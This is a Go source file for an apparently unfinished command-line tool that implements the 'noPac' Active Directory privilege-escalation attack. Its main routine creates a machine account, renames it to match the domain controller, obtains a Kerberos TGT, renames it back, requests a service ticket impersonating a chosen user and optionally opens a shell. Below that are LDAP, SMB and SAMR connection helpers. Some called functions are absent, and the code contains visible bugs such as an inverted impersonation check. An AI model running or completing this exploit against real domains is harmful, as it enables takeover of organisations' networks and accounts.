package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"path/filepath"

	"github.com/mandiant/gopacket/pkg/dcerpc"
	"github.com/mandiant/gopacket/pkg/dcerpc/samr"
	"github.com/mandiant/gopacket/pkg/flags"
	"github.com/mandiant/gopacket/pkg/ldap"
	"github.com/mandiant/gopacket/pkg/session"
	"github.com/mandiant/gopacket/pkg/smb"
)

var (
	impersonate string
	newName     string
	newPass     string
	useLDAP     bool
	shell       bool

	machineAccountQuota int
	machineDN           string
	spoofedMachineName  string
	dcfqdn              string
)

func init() {
	flag.StringVar(&impersonate, "impersonate", "", "User to impersonate")
	flag.StringVar(&newName, "new-name", generateRandomName(), "New username")
	flag.StringVar(&newPass, "new-pass", generateRandomPassword(), "New password")
	flag.BoolVar(&useLDAP, "use-ldap", false, "Use LDAP instead of LDAPS")
	flag.BoolVar(&shell, "shell", false, "Launch shell at the end")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, `noPac exploit - does some shit idk ill write this later

Options:
`)

		flag.PrintDefaults()
	}
}

func main() {
	// setup
	opts := flags.Parse()

	if opts.TargetStr == "" {
		flag.Usage()
		os.Exit(1)
	}

	if impersonate != "" {
		fmt.Println("[-] You must choose a user to impersonate")
		os.Exit(1)
	}

	target, creds, err := session.ParseTargetString(opts.TargetStr)
	if err != nil {
		log.Fatalf("[-] Error parsing target string: %v", err)
	}
	opts.ApplyToSession(&target, &creds)

	// setup clients
	ldapClient := setupLDAPClient(target, creds)
	defer ldapClient.Close()

	smbClient := setupSMBClient(target, creds)
	defer smbClient.Close()

	samrClient := setupSAMRClient(smbClient)
	defer smbClient.Close()

	// recon for required data
	ReconLDAP(ldapClient, opts)
	dcfqdn = opts.DcHost + "." + creds.Domain

	// create machine account
	err = addMachineAccount(newName, newPass, creds, samrClient, ldapClient)
	if err != nil {
		log.Fatalf("[-] Failed to create machine account: %v", err)
	}

	// spoof machine name
	spoofedMachineName = opts.DcHost
	err = changeSamAccountName(ldapClient, spoofedMachineName)
	if err != nil {
		log.Fatalf("[-] Failed to change machine account sAMAccountName: %v", err)
	}

	// issue TGT
	err = getTGT(creds)
	if err != nil {
		log.Fatalf("[-] Failed to get TGT: %v", err)
	}

	// back to original name
	spoofedMachineName = opts.DcHost
	err = changeSamAccountName(ldapClient, newName)
	if err != nil {
		log.Fatalf("[-] Failed to change machine account sAMAccountName: %v", err)
	}

	// issue ST for account to impersonate
	err = getST(creds, target)
	if err != nil {
		log.Fatalf("[-] Failed to get ST: %v", err)
	}

	if shell {
		absPath, _ := filepath.Abs(impersonate + ".ccache")

		err = launchShell(creds.Domain, target.Host, absPath, impersonate)
		if err != nil {
			log.Fatalf("[-] Failed to launch shell: %v", err)
		}
	}

	os.Exit(0)
}

func setupLDAPClient(target session.Target, creds session.Credentials) *ldap.Client {
	if useLDAP {
		target.Port = 389
	} else {
		target.Port = 636
	}

	ldapClient := ldap.NewClient(target, &creds)

	fmt.Printf("[*] Connecting to %s via LDAP...\n", target.Addr())
	if err := ldapClient.Connect(!useLDAP); err != nil {
		log.Fatalf("[-] LDAP connection failed: %v", err)
	}

	// login
	if creds.Domain != "" && creds.Hash == "" && !creds.UseKerberos && os.Getenv("GOPACKET_NO_UPN") == "" {
		creds.Username = fmt.Sprintf("%s@%s", creds.Username, creds.Domain)
		creds.Domain = ""
	}

	fmt.Printf("[*] Binding as %s...\n", creds.Username)
	if err := ldapClient.Login(); err != nil {
		log.Fatalf("[-] LDAP bind failed: %v", err)
	}
	fmt.Println("[+] LDAP bind successful.")

	return ldapClient
}

func setupSMBClient(target session.Target, creds session.Credentials) *smb.Client {
	target.Port = 445

	fmt.Printf("[*] Connecting to %s via SMB...\n", target.Addr())
	smbClient := smb.NewClient(target, &creds)
	if err := smbClient.Connect(); err != nil {
		log.Fatalf("[-] SMB connection failed: %v", err)
	}
	fmt.Println("[+] SMB session established.")

	return smbClient
}

func setupSAMRClient(smbClient *smb.Client) *samr.SamrClient {
	fmt.Printf("[*] Setting up SAMR connection...")

	// get SMB session key for password encryption
	sessionKey := smbClient.GetSessionKey()
	if len(sessionKey) == 0 {
		log.Fatalf("[-] Failed to SMB session key")
	}

	// open SAMR pipe
	pipe, err := smbClient.OpenPipe("samr")
	if err != nil {
		log.Fatalf("[-] Failed to open SAMR pipe: %v", err)
	}

	// create RPC client and bind
	rpcClient := dcerpc.NewClient(pipe)
	if err := rpcClient.Bind(samr.UUID, samr.MajorVersion, samr.MinorVersion); err != nil {
		log.Fatalf("[-] SAMR bind failed: %v", err)
	}
	fmt.Println("[+] SAMR bind successful.")

	samrClient := samr.NewSamrClient(rpcClient, sessionKey)

	if err = samrClient.Connect(); err != nil {
		log.Fatalf("[-] SAMR connection failed: %v", err)
	}
	return samrClient
}
